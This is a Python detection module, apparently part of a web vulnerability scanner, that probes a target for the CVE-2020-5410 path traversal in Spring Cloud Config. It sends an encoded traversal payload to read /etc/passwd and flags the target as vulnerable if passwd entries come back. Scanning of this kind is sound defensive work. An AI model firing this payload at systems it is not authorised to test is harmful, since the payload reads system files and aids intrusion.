#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2020_5410.py
   Description :   CVE-2020-5410 路径遍历漏洞检测模块
   Author :       sule01u
   date：          2023/10/9
"""
import requests
from urllib.parse import urljoin
from colorama import Fore
from utils.custom_headers import DEFAULT_HEADER, TIMEOUT
from utils.logging_config import configure_logger

# 初始化日志记录
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()

# CVE 编号
CVE_ID = "CVE-2020-5410"

# 路径遍历的有效载荷
PAYLOAD = "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"

# 检测路径遍历漏洞的标志性内容
VULNERABLE_SIGNS = [
    r"x:0:0:root:/root:",
    r"/sbin/nologin",
    r"daemon"
]


def check(url, dns_domain="", proxies=None, session=None, timeout=TIMEOUT):
    """
    对给定的目标 URL 检测 CVE-2020-5410 路径遍历漏洞
    :param url: 待检测的目标 URL
    :param dns_domain: DNS 日志域名（不需要使用，但为了保持接口一致性）
    :param proxies: 代理配置
    :param session: 复用的 Session 实例（可选）
    :param timeout: 请求超时时间（秒）
    :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
    """
    # 构建目标 URL
    target_url = urljoin(url, PAYLOAD)

    try:
        # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
        session = session or requests.Session()

        # 发送 GET 请求，测试路径遍历漏洞
        res = session.get(target_url, headers=DEFAULT_HEADER, timeout=timeout, verify=False, proxies=proxies)

        # 输出调试信息
        logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})

        # 检查响应内容是否包含漏洞特征
        if res.status_code == 200 and all(sign in res.text for sign in VULNERABLE_SIGNS):
            details = f"{CVE_ID} vulnerability detected at {target_url}"
            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
            return True, {
                "CVE_ID": CVE_ID,
                "URL": target_url,
                "Details": details,
                "ResponseSnippet": res.text[:200] + "...."  # 仅截取前200字符作为报告片段
            }

        # 如果未检测到漏洞，返回 False
        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
        return False, {}

    except (requests.Timeout, requests.ConnectionError, requests.RequestException) as e:
        # 捕获所有请求异常，并记录到日志
        logger.error(f"[Request Error：{e}]", extra={"target": target_url})
        return False, {}
    except Exception as e:
        # 捕获所有其他未知异常，并记录到日志
        logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
        return False, {}
    finally:
        # 如果 session 是本模块创建的，则关闭（否则保持复用的 session 不被关闭）
        if not session:
            session.close()


if __name__ == '__main__':
    # 测试用例
    proxy = {"http": "http://user:password@localhost:8080", "https": "http://user:password@localhost:8080"}

    # 测试 CVE-2020-5410 漏洞检测
    is_vul, res = check("http://localhost:8080/", proxies=proxy)
    print(is_vul, res)